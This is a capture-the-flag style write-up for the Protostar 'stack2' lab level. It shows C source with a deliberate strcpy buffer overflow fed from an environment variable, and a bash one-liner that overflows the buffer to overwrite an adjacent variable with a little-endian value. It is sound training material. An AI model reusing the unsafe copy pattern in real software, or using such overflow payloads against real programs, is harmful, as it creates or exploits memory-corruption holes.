## stack2

Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2


### Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
### Exploit Development Stratergy
We will set an environment variable GREENIE which will first fill the buffer and then the little endian representation of 0x0d0a0d0a in an attempt to modify the value of the modified variable.

We will have to set the value in little endian format.
According to [wikipedia](https://en.wikipedia.org/wiki/Endianness)
In computing, endianness is the order or sequence of bytes of a word of digital data in computer memory. Endianness is primarily expressed as big-endian (BE) or little-endian (LE). A big-endian system stores the most significant byte of a word at the smallest memory address and the least significant byte at the largest. A little-endian system, in contrast, stores the least-significant byte at the smallest address.

Exploit:
```bash
export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d\x0a\x0d' ")
./stack2
```
![exploit](pictures/stack2.png)
